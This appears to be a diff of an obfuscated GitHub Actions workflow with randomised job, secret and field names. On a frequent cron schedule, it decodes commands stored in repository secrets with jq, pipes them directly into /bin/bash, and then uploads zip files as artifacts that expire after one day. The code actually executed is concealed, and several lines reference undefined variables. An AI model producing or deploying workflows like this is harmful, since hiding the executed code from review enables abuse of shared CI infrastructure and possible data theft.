@@ -1,26 +1,26 @@
 name: lvjinyiwu
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '13 5/6 * * *'
-jobs:  # 25825
+    - cron: '46 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lvjinyiwu
         env:
-          rjaww954: ${{ secrets.rjaww954 }}
+          r8: ${{ secrets.r8 }}
         run: |
-          echo $rjaww954 | jq -r .ypirk890 | /bin/bash
-          echo $vf276 | jq -r .z4 | /bin/bash
-          echo $lbre2 | jq -r .ehdl0 | /bin/bash
-          echo $lh891 | jq -r .cvoxe09945 | /bin/bash
-          echo $ktj37 | jq -r .onny98599 | /bin/bash
-          echo $wbsa0650 | jq -r .lfkt92108 | /bin/bash
-          echo $ikl4697 | jq -r .xh06011 | /bin/bash
-          echo $ni80472 | jq -r .slgji0939 | /bin/bash
-          echo $nnlb3874 | jq -r .ttzae33 | /bin/bash
+          printf '%s' "$r8" | jq -r .u429 | /bin/bash
+          echo $arfm011 | jq -r .vrl920 | /bin/bash
+          echo $anoje30071 | jq -r .scuo9216 | /bin/bash
+          printf '%s' "$bfn98" | jq -r .qgrzf59988 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: sFnTBy3O
+          path: "*.zip"
+          retention-days: 1
